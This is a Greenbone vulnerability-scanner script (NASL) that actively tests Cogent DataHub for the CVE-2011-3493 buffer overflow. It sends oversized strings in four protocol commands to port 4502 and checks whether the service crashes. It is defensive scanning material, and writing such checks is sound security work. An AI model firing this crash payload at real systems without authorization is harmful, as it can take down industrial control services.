# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802246");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-09-22 10:24:03 +0200 (Thu, 22 Sep 2011)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2011-3493");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Cogent DataHub Unicode Buffer Overflow Vulnerability - Active Check");

  script_category(ACT_DENIAL);

  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports(4502);

  script_tag(name:"summary", value:"Cogent DataHub is prone to a buffer overflow vulnerability.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted requests and checks the responses.");

  script_tag(name:"insight", value:"The flaw is due to a stack based unicode buffer overflow error
  in the 'DH_OneSecondTick' function, which can be exploited by sending specially crafted 'domain',
  'report_domain', 'register_datahub', or 'slave' commands.");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to execute
  arbitrary code within the context of the privileged domain or cause a denial of service
  condition.");

  script_tag(name:"affected", value:"Cogent DataHub version 7.1.1.63 and prior.");

  script_tag(name:"solution", value:"Update to version 7.1.2 or later.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49611");
  script_xref(name:"URL", value:"http://aluigi.altervista.org/adv/cogent_1-adv.txt");
  script_xref(name:"URL", value:"http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-256-03.pdf");

  exit(0);
}

include("http_func.inc");
include("misc_func.inc");

port = 4502;
if (!get_port_state(port))
 exit(0);

soc = open_sock_tcp(port);
if (!soc)
  exit(0);

vt_strings = get_vt_strings();
payload = vt_strings["lowercase"] + "-test";

req = string('(domain "' + payload + '")', raw_string(0x0a));
send(socket:soc, data:req);
res = recv(socket:soc, length:1024);

if (!res || 'success "domain" "' + payload + '"' >!< res) {
  close(soc);
  exit(0);
}

attack =  crap(data: "a", length:512);
req = string('(domain "', attack, '")', raw_string(0x0a),
             '(report_domain "', attack, '" 1)', raw_string(0x0a),
             '(register_datahub "',attack, '")\r\n', raw_string(0x0a),
             '(slave "', attack, '" flags id1 id2 version secs nsecs)',
             raw_string(0x0a));

send(socket:soc, data:req);
res = recv(socket:soc, length:1024);
close(soc);

sleep(5);

soc = open_sock_tcp(port);
if (!soc) {
  security_message(port:port);
  exit(0);
}

close(soc);
exit(99);
